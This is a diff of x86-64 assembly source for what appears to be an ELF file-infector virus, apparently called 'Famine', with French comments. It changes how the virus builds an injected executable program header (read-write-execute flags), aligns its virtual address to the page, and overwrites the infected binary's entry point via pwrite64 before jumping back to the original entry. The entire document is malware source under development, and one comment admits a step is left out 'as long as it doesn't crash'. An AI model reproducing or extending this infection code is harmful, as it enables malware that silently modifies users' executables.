@@ -51,6 +51,17 @@ print_rax:
     POP_ALL
     ret
 
+	;   rax = ((value - (base % 0x1000) + 0x0FFF) & ~0x0FFF) + (base % 0x1000)
+	align_value:	; rax = value, rdx = base
+		; sauvegarder base % 0x1000 dans rcx
+		PUSH_ALLr
+		and		rdx, 0xFFF        ; rcx = base % 0x1000
+		sub		rax, rdx          ; rax = value - (base % 0x1000)
+		add		rax, 0x0FFF       ; rax += 0x0FFF
+		and		rax, ~0x0FFF      ; rax = align up to next page
+		add		rax, rdx          ; rax += (base % 0x1000)
+		POP_ALLr
+	ret
 
 
 
@@ -346,11 +357,11 @@ print_rax:
 
 		mov		BYTE [rel zero], 1
 		mov		qword [rel p_offset], 0
-		mov		qword [rel p_vaddr], -1
+		mov		qword [rel p_vaddr], 0
 		mov		qword [rel p_paddr], 0
 
 
-		mov		rax, [rel elfb + 0x28]
+		mov		rax, [rel elfb + ehdr.e_shoff]
 		mov		[rel p_offset], rax
 
 		mov		r10, 64 ; offset in file!
@@ -374,15 +385,16 @@ print_rax:
 		cmp		dword [rel elfp0], 1
 		jne		.no_load
 
-		mov		rax, [rel elfp0 + 0x10]
+		mov		rax, [rel elfp0 + phdr.p_vaddr]
+		add		rax, [rel elfp0 + phdr.p_memsz]
 		cmp		rax,  [rel p_vaddr]
-		jnb		.no_above
+		jb		.no_above
 		mov		[rel p_vaddr], rax
 	.no_above:
-		cmp		dword [rel elfp0 + 0x4], 6
+		cmp		dword [rel elfp0 + phdr.p_flags], 6
 		jnle	.no_load
-		mov		r15, [rel elfp0 + 0x10]
-		sub		r15, [rel elfp0 + 0x8]
+		mov		r15, [rel elfp0 + phdr.p_vaddr]
+		sub		r15, [rel elfp0 + phdr.p_offset]
 
 	.no_load:
 		cmp		dword [rel elfp0], 0
@@ -400,8 +412,14 @@ print_rax:
 	jnz	.loop
 
 		mov		rax, [rel p_vaddr]
-		add		rax, [rel elfb + 0x28]
-		add		rax, r15
+		;add		rax, [rel elfb + ehdr.e_shoff]
+		;add		rax, r15	-> Tant que ca crash pas on add pas!
+
+
+		mov		rdx, [rel p_offset]
+
+		call	align_value
+
 		mov		[rel p_vaddr], rax
 		mov		[rel entry], rax
 		mov		[rel p_paddr], rax
@@ -414,12 +432,13 @@ print_rax:
 		mov		rdx, 56
 		mov		r10, r11
 		syscall
-
+		;  LOAD           0x0000000000024770 0x0000000000026770 0x0000000000026770
+		; New Entry
 		mov		rax, SYS_pwrite64
 		mov		rdi, r12
 		lea		rsi, [rel p_vaddr]
 		mov		rdx, 8
-		mov		r10, 0x18
+		mov		r10, ehdr.e_entry
 		syscall
 
 
@@ -694,7 +713,6 @@ end_:
 	mov		rax, [rel entry]
 	mov		[rel new_entry], rax
 
-
 	mov		rax, [rel new_entry]
 	sub		rax, [rel old_entry]
 	lea		rdi, [rel _start]
@@ -730,6 +748,7 @@ end_:
 		mov		al, BYTE [rel zero]
 		test	al, al
 		jz		.exit_ret
+
 
 
 		jmp		[rel new_entry]
@@ -769,7 +788,7 @@ new_programheader:
 	p_type		dd	1
 	p_flags		dd	7
 	p_offset	dq	0
-	p_vaddr		dq	-1
+	p_vaddr		dq	0
 	p_paddr		dq	0
 	p_filez		dq	FAMINE_SIZE
 	p_memsz		dq	FAMINE_SIZE
